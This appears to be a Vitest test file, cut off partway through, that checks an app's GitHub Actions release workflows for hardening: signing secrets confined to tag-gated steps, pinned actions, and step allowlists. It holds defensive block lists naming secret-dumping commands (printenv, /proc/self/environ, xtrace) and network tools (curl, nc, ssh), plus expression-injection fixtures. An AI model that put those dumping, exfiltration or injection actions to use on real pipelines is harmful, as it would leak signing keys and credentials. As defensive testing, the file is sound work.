import { readFileSync } from 'node:fs';
import { join } from 'node:path';
import { describe, expect, it } from 'vitest';
import { parse } from 'yaml';

const ROOT = join(import.meta.dirname, '..');

interface Step {
  name?: string;
  uses?: string;
  if?: string;
  run?: string;
  shell?: string;
  env?: Record<string, string>;
  with?: Record<string, unknown>;
}
interface Job {
  needs?: string | string[];
  if?: string;
  environment?: string;
  permissions?: Record<string, string>;
  secrets?: unknown;
  'timeout-minutes'?: number;
  'runs-on'?: string;
  env?: Record<string, string>;
  concurrency?: { group?: string; 'cancel-in-progress'?: boolean };
  steps: Step[];
}
interface Workflow {
  on: { push?: { tags?: string[]; branches?: string[] }; workflow_dispatch?: unknown };
  permissions?: Record<string, string>;
  concurrency?: { group?: string; 'cancel-in-progress'?: boolean };
  env?: Record<string, string>;
  jobs: Record<string, Job>;
}
interface Loaded {
  text: string;
  wf: Workflow;
}

function load(name: string): Loaded {
  const text = readFileSync(join(ROOT, '.github', 'workflows', `${name}.yml`), 'utf8');
  return { text, wf: parse(text) as Workflow };
}

const ci = load('ci');
const android = load('release-android');
const ios = load('release-ios');
const windows = load('release-windows');

const SECRET_REF = /\$\{\{\s*secrets\.([A-Z0-9_]+)\s*\}\}/g;
const secretsIn = (value: unknown): string[] => [...JSON.stringify(value ?? '').matchAll(SECRET_REF)].map((m) => m[1] ?? '');
const allSteps = (wf: Workflow): Step[] => Object.values(wf.jobs).flatMap((job) => job.steps);
const job = (wf: Workflow, id: string): Job => {
  const found = wf.jobs[id];
  if (found === undefined) throw new Error(`no job ${id}`);
  return found;
};
const step = (j: Job, name: string): Step => {
  const found = j.steps.find((s) => s.name === name);
  if (found === undefined) throw new Error(`no step named ${name}`);
  return found;
};
const mutate = (wf: Workflow, change: (copy: Workflow) => void): Workflow => {
  const copy = structuredClone(wf);
  change(copy);
  return copy;
};

const ANDROID_SECRETS = ['ANDROID_KEYSTORE_BASE64', 'ANDROID_KEYSTORE_PASSWORD', 'ANDROID_KEY_ALIAS', 'ANDROID_KEY_PASSWORD'];
const IOS_SECRETS = ['IOS_DISTRIBUTION_CERT_P12_BASE64', 'IOS_DISTRIBUTION_CERT_PASSWORD', 'APPSTORE_API_PRIVATE_KEY'];
const WINDOWS_SECRETS = ['AZURE_TENANT_ID', 'AZURE_CLIENT_ID', 'AZURE_CLIENT_SECRET'];

/** Every script line a step that holds a secret in its `env` may contain, whole-line. Any other step holding one, or any other line, is a violation. */
const ANDROID_SECRET_STEP_LINES: Record<string, string[]> = {
  'Decode the signing keystore': ['umask 077', 'printf \'%s\' "$ANDROID_KEYSTORE_BASE64" | base64 -d > "$RUNNER_TEMP/release-keystore.p12"'],
  'Align-check and sign the APK (v2 and v3 signatures)': [
    'set -eu',
    'version="$(node -p "require(\'./package.json\').version")"',
    'mkdir -p release',
    'zipalign -c -P 16 4 unsigned/app-release-unsigned.apk',
    'apksigner sign \\',
    '--ks "$RUNNER_TEMP/release-keystore.p12" \\',
    '--ks-pass env:ANDROID_KEYSTORE_PASSWORD \\',
    '--ks-key-alias "$ANDROID_KEY_ALIAS" \\',
    '--key-pass env:ANDROID_KEY_PASSWORD \\',
    '--v2-signing-enabled true \\',
    '--v3-signing-enabled true \\',
    '--out "release/InspectorHub-$version.apk" \\',
    'unsigned/app-release-unsigned.apk',
  ],
};
/** iOS hands every secret to an action through `with`; no script step may hold one. */
const IOS_SECRET_STEP_LINES: Record<string, string[]> = {};
const WINDOWS_SECRET_STEP_LINES: Record<string, string[]> = {
  'Sign the HEIC helper with Azure Artifact Signing': [
    "Install-PackageProvider -Name NuGet -MinimumVersion 2.8.5.201 -Force -Scope CurrentUser",
    "Install-Module -Name TrustedSigning -MinimumVersion 0.5.0 -Force -Repository PSGallery -Scope CurrentUser",
    "$helper = (Resolve-Path 'dist-electron/native/win-heic-helper.exe').Path",
    'Invoke-TrustedSigning -Endpoint $env:AZURE_SIGNING_ENDPOINT -CertificateProfileName $env:AZURE_SIGNING_PROFILE -CodeSigningAccountName $env:AZURE_SIGNING_ACCOUNT -TimestampRfc3161 https://timestamp.acs.microsoft.com -TimestampDigest SHA256 -FileDigest SHA256 -Files $helper',
  ],
  'Build the NSIS installer': ['npx electron-builder --win nsis --x64 --config electron/builder/electron-builder.config.mjs --publish never'],
  'Build the signed unpacked Windows package': ['npx electron-builder --dir --win --x64 --config electron/builder/electron-builder.config.mjs --publish never'],
};

// ---- the checkers: each returns the list of violations, so a mutated copy can be shown to be rejected ----

/** No expression of any kind inside a script (an attacker-controlled name such as a branch or an input would run as shell), and only the default shell. */
function injection(wf: Workflow): string[] {
  const out: string[] = [];
  for (const [id, j] of Object.entries(wf.jobs)) {
    for (const s of j.steps) {
      if (s.run?.includes('${{') === true) out.push(`${id}/${s.name ?? s.run}: expression in run`);
      if (s.shell !== undefined && !['bash', 'pwsh'].includes(s.shell)) out.push(`${id}/${s.name ?? ''}: shell ${s.shell}`);
    }
  }
  return out;
}

/** A secret is only ever `secrets.NAME` with an allowed name, inside the env or with of a step. */
function secretUse(wf: Workflow, allowed: string[]): string[] {
  const out: string[] = [];
  if (secretsIn(wf.env).length > 0 || JSON.stringify(wf.env ?? {}).includes('secrets')) out.push('top-level env');
  for (const [id, j] of Object.entries(wf.jobs)) {
    if (j.secrets !== undefined) out.push(`${id}: secrets key (inherit)`);
    if (JSON.stringify(j.env ?? {}).includes('secrets')) out.push(`${id}: job env`);
    if (JSON.stringify(j.if ?? '').includes('secrets')) out.push(`${id}: job if`);
    const words = JSON.stringify(j).match(/\bsecrets\b/g)?.length ?? 0;
    const refs = secretsIn(j);
    if (words !== refs.length) out.push(`${id}: a secrets reference that is not secrets.NAME`);
    for (const ref of refs) if (!allowed.includes(ref)) out.push(`${id}: unknown secret ${ref}`);
    for (const s of j.steps) {
      for (const field of ['run', 'if', 'name', 'shell'] as const) {
        if (JSON.stringify(s[field] ?? '').includes('secrets')) out.push(`${id}/${s.name ?? ''}: secrets in ${field}`);
      }
    }
    if (refs.length > 0 && !j.environment) out.push(`${id}: holds a secret but names no environment`);
  }
  return out;
}

/** A step that holds a secret in its env is listed, and its script is exactly the listed lines. */
function secretSteps(wf: Workflow, rules: Record<string, string[]>): string[] {
  const out: string[] = [];
  for (const [id, j] of Object.entries(wf.jobs)) {
    for (const s of j.steps) {
      if (secretsIn(s.env).length === 0) continue;
      const lines = rules[s.name ?? ''];
      if (lines === undefined) {
        out.push(`${id}/${s.name ?? ''}: a secret in env of an unlisted step`);
        continue;
      }
      for (const raw of (s.run ?? '').split('\n')) {
        const line = raw.trim();
        if (line !== '' && !lines.includes(line)) out.push(`${id}/${s.name ?? ''}: unlisted line ${line}`);
      }
    }
  }
  return out;
}

const FORBIDDEN: [string, RegExp][] = [
  ['set -x', /set\s+-[a-z]*x/],
  ['bash -x', /bash\s+-[a-z]*x/],
  ['xtrace', /xtrace/],
  ['export -p', /export\s+-p/],
  ['declare -p', /declare\s+-p/],
  ['/proc/self/environ', /\/proc\/self\/environ/],
  ['::add-mask', /::add-mask/],
  ['ACTIONS_RUNNER_DEBUG', /ACTIONS_RUNNER_DEBUG/],
  ['ACTIONS_STEP_DEBUG', /ACTIONS_STEP_DEBUG/],
  ['printenv', /\bprintenv\b/],
  ['env pipe', /\benv\s*\|/],
  ['bare env', /^\s*env\s*$/m],
  ['key block', /-----BEGIN/],
  ['long base64', /[A-Za-z0-9+/=]{80,}/],
];
function forbiddenText(text: string): string[] {
  return FORBIDDEN.filter(([, re]) => re.test(text)).map(([name]) => name);
}

/** A script that calls the Gradle wrapper must not depend on the committed file mode. */
function gradlew(wf: Workflow): string[] {
  const out: string[] = [];
  for (const [id, j] of Object.entries(wf.jobs)) {
    for (const s of j.steps) {
      let chmod = false;
      for (const raw of (s.run ?? '').split('\n')) {
        const line = raw.trim();
        if (line.startsWith('chmod +x ./gradlew')) chmod = true;
        else if (line.includes('gradlew') && !chmod && !/^(sh|bash) \.\/gradlew/.test(line)) out.push(`${id}/${s.name ?? ''}: ${line}`);
      }
    }
  }
  return out;
}

/** Every checkout drops the token, and a job that handles the signing key restores no cache. */
function hygiene(wf: Workflow, signingJobs: string[]): string[] {
  const out: string[] = [];
  for (const [id, j] of Object.entries(wf.jobs)) {
    for (const s of j.steps) {
      if (s.uses?.startsWith('actions/checkout@') === true && s.with?.['persist-credentials'] !== false) out.push(`${id}: checkout keeps credentials`);
      if (signingJobs.includes(id) && s.uses?.startsWith('actions/setup-node@') === true && s.with?.cache !== undefined) out.push(`${id}: cache in a signing job`);
    }
  }
  return out;
}

/** Android: signing, its environment and the Release exist only for a tag; a dispatch from a branch builds unsigned and touches no secret. */
function androidGating(wf: Workflow): string[] {
  const out: string[] = [];
  const need = (label: string, ok: boolean) => {
    if (!ok) out.push(label);
  };
  need('sign if', job(wf, 'sign').if === "github.ref_type == 'tag'");
  need('sign environment', job(wf, 'sign').environment === 'android-release');
  need('sign needs build', job(wf, 'sign').needs === 'build');
  need('release if', job(wf, 'release').if === "github.event_name == 'push' && github.ref_type == 'tag'");
  need('release needs sign', job(wf, 'release').needs === 'sign');
  for (const id of ['verify', 'build', 'release']) {
    need(`${id} holds no secret`, secretsIn(job(wf, id)).length === 0);
    need(`${id} names no environment`, job(wf, id).environment === undefined);
  }
  need('only release writes', Object.entries(wf.jobs).every(([id, j]) => (id === 'release' ? j.permissions?.contents === 'write' : j.permissions === undefined)));
  return out;
}

/** iOS: only a tag ref reaches the signing job. */
function iosGating(wf: Workflow): string[] {
  const out: string[] = [];
  if (job(wf, 'testflight').if !== "github.ref_type == 'tag'") out.push('testflight if');
  if (job(wf, 'testflight').environment !== 'ios-release') out.push('testflight environment');
  if (secretsIn(job(wf, 'verify')).length > 0) out.push('verify holds a secret');
  if (job(wf, 'verify').environment !== undefined) out.push('verify names an environment');
  return out;
}

/** The order inside the Android signing job. */
function signOrder(wf: Workflow): string[] {
  const out: string[] = [];
  const j = job(wf, 'sign');
  const at = (name: string) => j.steps.findIndex((s) => s.name === name);
  const names = [
    'Select the pinned build tools',
    'Decode the signing keystore',
    'Align-check and sign the APK (v2 and v3 signatures)',
    'Verify the signature and the version',
    'Checksums',
  ];
  const indexes = names.map(at);
  if (indexes.some((i) => i < 0) || indexes.some((i, n) => n > 0 && i <= (indexes[n - 1] ?? 0))) out.push('step order');
  const last = j.steps[j.steps.length - 1];
  if (last?.name !== 'Delete the keystore' || last.if !== 'always()' || last.run !== 'rm -f "$RUNNER_TEMP/release-keystore.p12"') out.push('cleanup is not the last step with always()');
  const upload = j.steps.findIndex((s) => s.uses?.startsWith('actions/upload-artifact@') === true);
  if (upload < at('Checksums') || upload > j.steps.length - 2) out.push('upload position');
  return out;
}

/** The signed job uploads exactly the release directory. */
function uploadPaths(wf: Workflow): string[] {
  const out: string[] = [];
  const uploads = job(wf, 'sign').steps.filter((s) => s.uses?.startsWith('actions/upload-artifact@') === true);
  if (uploads.length !== 1) out.push('expected one upload');
  for (const u of uploads) if (u.with?.path !== 'release/') out.push(`upload path ${String(u.with?.path)}`);
  return out;
}

/** The steps of a signing job, by name (or by action without its commit, or by first script line). Nothing may be added, removed or reordered unnoticed. */
const label = (s: Step): string => s.name ?? (s.uses !== undefined ? s.uses.split('@')[0] ?? '' : `run: ${(s.run ?? '').split('\n')[0] ?? ''}`);
const withAction = (s: Step): string => (s.name !== undefined && s.uses !== undefined ? `${s.name} | ${s.uses.split('@')[0] ?? ''}` : label(s));

const EXPECTED_STEPS = {
  androidSign: [
    'actions/checkout',
    'actions/setup-node',
    'actions/download-artifact',
    'Select the pinned build tools',
    'Decode the signing keystore',
    'Align-check and sign the APK (v2 and v3 signatures)',
    'Verify the signature and the version',
    'Checksums',
    'actions/upload-artifact',
    'Delete the keystore',
  ],
  androidRelease: ['actions/download-artifact', 'Create the draft Release | softprops/action-gh-release'],
  iosTestflight: [
    'actions/checkout',
    'actions/setup-node',
    'run: npm ci',
    'run: npm run build',
    'Set the iOS version from package.json and the build number from the run',
    'run: npx cap sync ios',
    'Warn when the encryption compliance code is not recorded',
    'Import the distribution certificate | apple-actions/import-codesign-certs',
    'Download the App Store provisioning profile | apple-actions/download-provisioning-profiles',
    'Archive and export the IPA',
    'Upload to TestFlight | apple-actions/upload-testflight-build',
  ],
  windowsSign: [
    'actions/checkout',
    'actions/setup-node',
    'run: npm ci',
    'run: npm run build',
    'run: npm run build:electron',
    'Build the Windows HEIC helper',
    'Sign the HEIC helper with Azure Artifact Signing',
    'Calculate the final helper SHA-256',
    'actions/upload-artifact',
    'Build the signed unpacked Windows package',
    'run: npm run check:electron-package',
    'Build the NSIS installer',
    'run: npm run check:electron-package',
    'Verify Authenticode and record publisher',
    'Create Windows SHA-256 checksums',
    'actions/upload-artifact',
  ],
  windowsRelease: ['actions/download-artifact', 'Create the draft Release | softprops/action-gh-release'],
};

/** Per job, the only actions it may use (by owner/repo). A new action fails until this list is edited on purpose. */
const ALLOWED_USES: Record<string, Record<string, string[]>> = {
  android: {
    verify: ['actions/checkout', 'actions/setup-node'],
    build: ['actions/checkout', 'actions/setup-node', 'actions/setup-java', 'actions/upload-artifact'],
    sign: ['actions/checkout', 'actions/setup-node', 'actions/download-artifact', 'actions/upload-artifact'],
    release: ['actions/download-artifact', 'softprops/action-gh-release'],
  },
  ios: {
    verify: ['actions/checkout', 'actions/setup-node'],
    testflight: ['actions/checkout', 'actions/setup-node', 'apple-actions/import-codesign-certs', 'apple-actions/download-provisioning-profiles', 'apple-actions/upload-testflight-build'],
  },
  windows: {
    verify: ['actions/checkout', 'actions/setup-node', 'actions/upload-artifact'],
    build: ['actions/checkout', 'actions/setup-node', 'actions/upload-artifact'],
    sign: ['actions/checkout', 'actions/setup-node', 'actions/upload-artifact'],
    release: ['actions/download-artifact', 'softprops/action-gh-release'],
  },
};

function stepAllowlist(j: Job, expected: string[]): string[] {
  const got = j.steps.map(withAction);
  return JSON.stringify(got) === JSON.stringify(expected) ? [] : [`steps differ: ${got.join(' > ')}`];
}

function usesAllowlist(wf: Workflow, allowed: Record<string, string[]>): string[] {
  const out: string[] = [];
  for (const [id, j] of Object.entries(wf.jobs)) {
    for (const s of j.steps) {
      const name = s.uses?.split('@')[0];
      if (name !== undefined && !(allowed[id] ?? []).includes(name)) out.push(`${id}: action ${name} is not allowed`);
    }
  }
  return out;
}

const KEYSTORE_STEPS = ['Decode the signing keystore', 'Align-check and sign the APK (v2 and v3 signatures)', 'Delete the keystore'];
const TOOLS = /\b(curl|wget|nc|ncat|scp|ssh|sftp|rsync|cp|mv|ln|tar|zip|openssl|keytool|python3?|perl|ruby)\b/;
const ENV_FILES = /GITHUB_(ENV|OUTPUT|PATH)/;
const PATH_STEP = 'Select the pinned build tools';
const PATH_LINE = 'echo "$tools" >> "$GITHUB_PATH"';

/** A signing job may not move, send or smuggle anything: no copy or network tool, no keystore path outside three steps, no write to the environment files except the one build-tools step, no keys that change how steps run. */
function signingJob(j: Job): string[] {
  const out: string[] = [];
  for (const key of ['continue-on-error', 'strategy', 'defaults', 'container', 'services']) if (key in j) out.push(`job key ${key}`);
  for (const s of j.steps) {
    const who = s.name ?? s.uses ?? '';
    if ('continue-on-error' in s) out.push(`${who}: continue-on-error`);
    const lines = (s.run ?? '').split('\n').map((l) => l.trim());
    for (const line of lines) {
      if (TOOLS.test(line) && !(s.name === 'Decode the signing keystore' && /^printf .* \| base64 -d > /.test(line))) out.push(`${who}: tool in ${line}`);
      if (/release-keystore|keystore\.p12/.test(line) && !KEYSTORE_STEPS.includes(s.name ?? '')) out.push(`${who}: keystore path outside its steps`);
      if (ENV_FILES.test(line) && !(s.name === PATH_STEP && line === PATH_LINE)) out.push(`${who}: write to an environment file`);
    }
    if (/base64/.test(s.run ?? '') && s.name !== 'Decode the signing keystore') out.push(`${who}: base64 outside the decode`);
  }
  return out;
}

/** The only lines of the Android signing job that mention the release directory, and the Release job's files. */
function releaseDir(wf: Workflow): string[] {
  const out: string[] = [];
  const lines = job(wf, 'sign').steps.flatMap((s) => (s.run ?? '').split('\n').map((l) => l.trim())).filter((l) => l.includes('release/'));
  const expected = ['--out "release/InspectorHub-$version.apk" \\', 'apk="release/InspectorHub-$version.apk"'];
  if (JSON.stringify(lines) !== JSON.stringify(expected)) out.push(`release/ lines: ${lines.join(' | ')}`);
  const create = job(wf, 'release').steps.find((s) => s.uses?.startsWith('softprops/action-gh-release@'));
  if (create?.with?.files !== 'release/*.apk\nrelease/SHA256SUMS\n') out.push('release files');
  if (job(wf, 'sign').steps.find((s) => s.name === 'Checksums')?.run !== 'sha256sum *.apk > SHA256SUMS') out.push('checksums');
  return out;
}

// ---- the real workflows ----

describe.each([
  ['release-android', android, ANDROID_SECRETS, ANDROID_SECRET_STEP_LINES, ['sign']],
  ['release-ios', ios, IOS_SECRETS, IOS_SECRET_STEP_LINES, ['testflight']],
  ['release-windows', windows, WINDOWS_SECRETS, WINDOWS_SECRET_STEP_LINES, ['sign']],
] as const)('%s workflow hardening', (_name, { text, wf }, allowed, rules, signing) => {
  it('runs on a pushed v* tag and by hand, and on nothing else', () => {
    expect(Object.keys(wf.on).sort()).toEqual(['push', 'workflow_dispatch']);
    expect(wf.on.push?.tags).toEqual(['v*']);
    expect(wf.on.push?.branches).toBeUndefined();
  });

  it('reads the repository by default; any write is granted to one named job', () => {
    expect(wf.permissions).toEqual({ contents: 'read' });
    for (const j of Object.values(wf.jobs)) {
      if (j.permissions !== undefined) expect(j.permissions).toEqual({ contents: 'write' });
    }
  });

  it('every job has a timeout and runs on a hosted runner, and each ref has its own concurrency group that never cancels a release', () => {
    for (const j of Object.values(wf.jobs)) {
      expect(typeof j['timeout-minutes']).toBe('number');
      expect(j['runs-on']).toMatch(/^(ubuntu-latest|macos-26|windows-latest)$/);
    }
    expect(wf.concurrency?.group).toContain('${{ github.ref }}');
    expect(wf.concurrency?.['cancel-in-progress']).toBe(false);
  });

  it('every action is pinned to a 40-hex commit with its tag in a comment (control: there are actions to check)', () => {
    const uses = text.split('\n').map((line) => line.replace(/\r$/, '')).filter((line) => /^\s*-?\s*uses:/.test(line));
    expect(uses.length).toBeGreaterThanOrEqual(6);
    for (const line of uses) expect(line, line).toMatch(/uses: [\w.-]+\/[\w.-]+@[0-9a-f]{40} # v\d+\.\d+\.\d+$/);
    expect(allSteps(wf).filter((s) => s.uses !== undefined)).toHaveLength(uses.length);
  });

  it('has none of the injection, secret-use, secret-step, forbidden-text, checkout and wrapper violations', () => {
    expect(injection(wf)).toEqual([]);
    expect(secretUse(wf, [...allowed])).toEqual([]);
    expect(secretSteps(wf, rules)).toEqual([]);
    expect(forbiddenText(text)).toEqual([]);
    expect(hygiene(wf, [...signing])).toEqual([]);
    expect(gradlew(wf)).toEqual([]);
    // Control: the checkers looked at something.
    expect(allSteps(wf).filter((s) => s.run !== undefined).length).toBeGreaterThan(5);
    expect([...text.matchAll(SECRET_REF)].length).toBeGreaterThan(0);
  });

  it('every secret reference in the text is inside the env or with of a step (none was missed by the structural walk)', () => {
    let seen = 0;
    for (const s of allSteps(wf)) seen += secretsIn(s.env).length + secretsIn(s.with).length;
    expect(seen).toBe([...text.matchAll(SECRET_REF)].length);
  });

  it('every credential input of an action is an expression, never a literal', () => {
    for (const s of allSteps(wf)) {
      for (const [key, value] of Object.entries(s.with ?? {})) {
        if (/pass|private-key|p12|secret|token/i.test(key)) expect(String(value), key).toMatch(/^\$\{\{ (secrets|vars)\./);
      }
    }
  });

  it('the verify job runs everything the CI verify job runs, holds no secret, and the tag must equal the package.json version', () => {
    const wanted = Object.values(ci.wf.jobs)
      .find((j) => j.steps.some((s) => s.run === 'npm run typecheck'))
      ?.steps.filter((s) => s.run !== undefined && !s.run.startsWith('npx cap sync') && !s.run.includes('api:types:check'))
      .map((s) => s.run);
    expect(wanted?.length).toBeGreaterThanOrEqual(5);
    const verify = job(wf, 'verify');
    for (const run of wanted ?? []) expect(verify.steps.map((s) => s.run), run).toContain(run);
    expect(verify.steps.some((s) => s.run?.includes('api:types:check'))).toBe(true);
    expect(secretsIn(verify)).toEqual([]);
    const tag = verify.steps.find((s) => s.run?.includes('GITHUB_REF_NAME'));
    expect(tag?.if).toBe("github.ref_type == 'tag'");
    expect(tag?.run).toContain("require('./package.json').version");
    expect(tag?.run).toMatch(/v\$\(|v\$version/);
    expect(tag?.run).toContain('exit 1');
    for (const [id, j] of Object.entries(wf.jobs)) {
      if (id !== 'verify') expect(j.needs, id).toBeDefined();
    }
  });
});

describe('release workflow job concurrency', () => {
  it('serializes Android, iOS, and Windows draft creation for the same ref', () => {
    for (const [workflow, id] of [[android.wf, 'release'], [ios.wf, 'testflight'], [windows.wf, 'release']] as const) {
      expect(job(workflow, id).concurrency).toEqual({
        group: 'release-assets-${{ github.ref }}',
        'cancel-in-progress': false,
      });
    }
  });
});

describe('Windows workflow hardening', () => {
  it('builds the real HEIC helper before packaging in CI and release verify', () => {
    const ciWindows = job(ci.wf, 'windows');
    const verify = job(windows.wf, 'verify');
    const assertHelperBeforePack = (steps: Step[], context: string) => {
      const helper = steps.findIndex((s) => (s.run ?? '').includes('build:heic-helper'));
      const pack = steps.findIndex((s) => (s.run ?? '').includes('electron-builder --dir'));
      expect(helper, `${context}: helper build step`).toBeGreaterThanOrEqual(0);
      expect(pack, `${context}: package step`).toBeGreaterThan(helper);
    };
    assertHelperBeforePack(ciWindows.steps, 'CI');
    assertHelperBeforePack(verify.steps, 'release verify');
    assertHelperBeforePack(job(windows.wf, 'sign').steps, 'release sign');
    expect(ciWindows.steps.some((s) => (s.run ?? '').includes('check:electron-bundle'))).toBe(true);
    expect(ciWindows.steps.some((s) => (s.run ?? '').includes('check:electron-package'))).toBe(true);
    for (const text of [ci.text, windows.text]) {
      expect(text).toContain('check:electron-package');
      expect(text).not.toMatch(/check-codec-review|libheif|check:third-party/);
    }
  });

  it('uploads the built helper with a checksum and 30-day retention', () => {
    for (const [workflow, artifactName] of [[ci.wf, 'windows-heic-helper'], [windows.wf, 'windows-heic-helper'], [windows.wf, 'windows-heic-helper-signed']] as const) {
      const candidate = Object.values(workflow.jobs).flatMap((j) => j.steps)
        .find((s) => s.uses?.startsWith('actions/upload-artifact@') && s.with?.name === artifactName);
      expect(candidate?.with?.path).toBe('dist-electron/native/win-heic-helper.exe');
      expect(candidate?.with?.['retention-days']).toBe(30);
      expect(Object.values(workflow.jobs).flatMap((j) => j.steps).some((s) => (s.run ?? '').includes('Get-FileHash'))).toBe(true);
    }
  });

  it('uses a post-sign helper hash and excludes only the helper from electron-builder signing', () => {
    const sign = job(windows.wf, 'sign');
    const azure = step(sign, 'Sign the HEIC helper with Azure Artifact Signing');
    expect(azure.if).toBe("env.OI_WINDOWS_SIGNING == 'azure'");
    const build = step(sign, 'Build the NSIS installer');
    expect(build.run).toContain('electron-builder --win nsis');
    expect(build.env?.AZURE_CLIENT_SECRET).toBe('${{ secrets.AZURE_CLIENT_SECRET }}');
  });

  it('uses tag-only protected signing and lets manual dispatch stop at the unsigned artifact', () => {
    expect(job(windows.wf, 'sign').environment).toBe('windows-release');
    expect(job(windows.wf, 'sign').if).toBe("github.event_name == 'push' && github.ref_type == 'tag'");
    expect(job(windows.wf, 'sign').needs).toBe('build');
    expect(job(windows.wf, 'release').concurrency).toEqual({
      group: 'release-assets-${{ github.ref }}',
      'cancel-in-progress': false,
    });
    expect(job(windows.wf, 'release').if).toBe("github.event_name == 'push' && github.ref_type == 'tag'");
    expect(job(windows.wf, 'release').needs).toBe('sign');
    expect(job(windows.wf, 'build').environment).toBeUndefined();
    expect(secretsIn(job(windows.wf, 'verify'))).toEqual([]);
    expect(secretsIn(job(windows.wf, 'build'))).toEqual([]);
  });

  it('keeps signing and draft release steps on their reviewed allowlists', () => {
    expect(stepAllowlist(job(windows.wf, 'sign'), EXPECTED_STEPS.windowsSign)).toEqual([]);
    expect(signingJob(job(windows.wf, 'sign'))).toEqual([]);
    expect(stepAllowlist(job(windows.wf, 'release'), EXPECTED_STEPS.windowsRelease)).toEqual([]);
    const create = step(job(windows.wf, 'release'), 'Create the draft Release');
    expect(create.with?.draft).toBe(true);
    expect(create.with?.fail_on_unmatched_files).toBe(true);
    expect(create.with?.files).toBe('release/InspectorHub-Setup-*.exe\nrelease/*.blockmap\nrelease/latest.yml\nrelease/SHA256SUMS-windows\n');
  });
});

describe('release-android specifics', () => {
  const { wf } = android;
  const build = job(wf, 'build');
  const sign = job(wf, 'sign');

  it('the real workflow passes the gating, order and upload checks (control for the fixtures below)', () => {
    expect(androidGating(wf)).toEqual([]);
    expect(signOrder(wf)).toEqual([]);
    expect(uploadPaths(wf)).toEqual([]);
  });

  it('the unsigned build job names no environment, reads no secret and calls the wrapper without depending on its file mode', () => {
    expect(build.environment).toBeUndefined();
    expect(secretsIn(build)).toEqual([]);
    const gradle = step(build, 'Build the unsigned release APK');
    expect(gradle.run).toBe('chmod +x ./gradlew\n./gradlew --no-daemon assembleRelease\n');
    expect(gradle['working-directory' as keyof Step]).toBe('android');
    const upload = build.steps.find((s) => s.uses?.startsWith('actions/upload-artifact@'));
    expect(upload?.with?.path).toBe('android/app/build/outputs/apk/release/app-release-unsigned.apk');
    expect(upload?.with?.name).toBe('android-unsigned');
  });

  it('gives each step only the secrets it needs', () => {
    expect(Object.keys(step(sign, 'Decode the signing keystore').env ?? {})).toEqual(['ANDROID_KEYSTORE_BASE64']);
    expect(Object.keys(step(sign, 'Align-check and sign the APK (v2 and v3 signatures)').env ?? {}).sort()).toEqual([
      'ANDROID_KEYSTORE_PASSWORD',
      'ANDROID_KEY_ALIAS',
      'ANDROID_KEY_PASSWORD',
    ]);
    expect(sign.steps.filter((s) => secretsIn(s).length > 0)).toHaveLength(2);
  });

  it('decodes the keystore under a restrictive umask into the runner temp directory, never into the workspace', () => {
    const decode = step(sign, 'Decode the signing keystore').run ?? '';
    expect(decode).toContain('umask 077');
    expect(decode).toContain('$RUNNER_TEMP/release-keystore.p12');
    expect(decode).not.toContain('GITHUB_WORKSPACE');
  });

  it('pins one build-tools version and fails with a message when it is not there', () => {
    expect(wf.env?.BUILD_TOOLS_VERSION).toBe('36.0.0');
    const select = step(sign, 'Select the pinned build tools').run ?? '';
    expect(select).toContain('$ANDROID_HOME/build-tools/$BUILD_TOOLS_VERSION');
    expect(select).toContain('::error::Build tools $BUILD_TOOLS_VERSION are not available');
    expect(select).toContain('exit 1');
    expect(select).not.toContain('sort -V');
  });

  it('signs with apksigner (v2 and v3, never the default v1-only jarsigner) and verifies both schemes and the version', () => {
    const run = step(sign, 'Align-check and sign the APK (v2 and v3 signatures)').run ?? '';
    expect(run).toContain('apksigner sign');
    expect(run).toContain('--v2-signing-enabled true');
    expect(run).toContain('--v3-signing-enabled true');
    expect(run).not.toContain('jarsigner');
    const verify = step(sign, 'Verify the signature and the version').run ?? '';
    expect(verify).toContain('apksigner verify --verbose --print-certs');
    expect(verify).toContain('Verified using v2 scheme (APK Signature Scheme v2): true');
    expect(verify).toContain('Verified using v3 scheme (APK Signature Scheme v3): true');
    expect(verify).toContain("versionName='$version'");
    expect(verify).toContain('GITHUB_STEP_SUMMARY');
    expect(verify).toContain('certificate SHA-256 digest');
  });

  it('publishes checksums and creates a draft Release that the workflow never publishes', () => {
    expect(step(sign, 'Checksums').run).toBe('sha256sum *.apk > SHA256SUMS');
    const release = job(wf, 'release');
    expect(release.permissions).toEqual({ contents: 'write' });
    const create = step(release, 'Create the draft Release');
    expect(create.with?.draft).toBe(true);
    expect(String(create.with?.files)).toContain('release/SHA256SUMS');
    expect(String(create.with?.files)).toContain('release/*.apk');
  });
});

describe('release-ios specifics', () => {
  const { wf } = ios;
  const testflight = job(wf, 'testflight');

  it('the real workflow passes the gating check (control for the fixtures below)', () => {
    expect(iosGating(wf)).toEqual([]);
  });

  it('is written to the plan: macos-26, an environment, the App Store Connect export method, encryption declared', () => {
    expect(testflight['runs-on']).toBe('macos-26');
    expect(testflight.needs).toBe('verify');
    const build = step(testflight, 'Archive and export the IPA').run ?? '';
    expect(build).toContain('npx cap build ios');
    expect(build).toContain('--xcode-export-method app-store-connect');
    const upload = testflight.steps.find((s) => s.uses?.startsWith('apple-actions/upload-testflight-build@'));
    expect(upload?.with?.['uses-non-exempt-encryption']).toBe('true');
    expect(testflight.steps.some((s) => s.uses?.startsWith('apple-actions/import-codesign-certs@'))).toBe(true);
  });

  it('takes the version from package.json before building; the build number cannot repeat across runs or re-runs', () => {
    const syncName = 'Set the iOS version from package.json and the build number from the run';
    const sync = step(testflight, syncName);
    expect(sync.env).toEqual({ RUN_NUMBER: '${{ github.run_number }}', RUN_ATTEMPT: '${{ github.run_attempt }}' });
    expect(sync.run).toContain('node scripts/sync-ios-version.mjs --build-number "$((RUN_NUMBER * 100 + RUN_ATTEMPT))"');
    expect(sync.run).toContain('node scripts/sync-ios-version.mjs --check');
    const at = (name: string) => testflight.steps.findIndex((s) => s.name === name);
    expect(at(syncName)).toBeLessThan(at('Archive and export the IPA'));
  });
});

// ---- negative fixtures: a mutated copy of the parsed workflow (or of its text) must be rejected ----

describe('the checkers reject what they exist to reject', () => {
  const addRun = (wf: Workflow, id: string, run: string, extra: Partial<Step> = {}): Workflow =>
    mutate(wf, (c) => {
      job(c, id).steps.push({ name: 'Added', run, ...extra });
    });

  describe('script injection', () => {
    it.each([
      '${{ github.ref_name }}',
      '${{ github.head_ref }}',
      '${{ github.event.head_commit.message }}',
      '${{ github.event.inputs.x }}',
      '${{ inputs.x }}',
    ])('rejects %s in a run, in both workflows', (expression) => {
      expect(injection(addRun(android.wf, 'build', `echo ${expression}`))).toHaveLength(1);
      expect(injection(addRun(ios.wf, 'verify', `echo ${expression}`))).toHaveLength(1);
    });

    it('rejects a custom shell, and accepts the workflows as they are', () => {
